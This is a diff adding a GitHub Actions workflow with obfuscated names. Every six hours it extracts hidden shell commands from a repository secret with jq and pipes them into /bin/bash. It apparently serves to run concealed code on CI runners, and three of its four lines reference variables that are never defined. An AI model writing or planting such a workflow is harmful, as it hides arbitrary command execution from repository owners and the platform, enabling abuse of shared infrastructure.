@@ -1,0 +1,21 @@
+name: wendingxxo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wendingxxo
+        env:
+          hh5: ${{ secrets.hh5 }}
+        run: |
+          echo $hh5 | jq -r .ute6673 | /bin/bash
+          echo $fziz7743 | jq -r .gr11112 | /bin/bash
+          echo $c0 | jq -r .qf41680 | /bin/bash
+          echo $nshd29401 | jq -r .lvqqq973 | /bin/bash
+
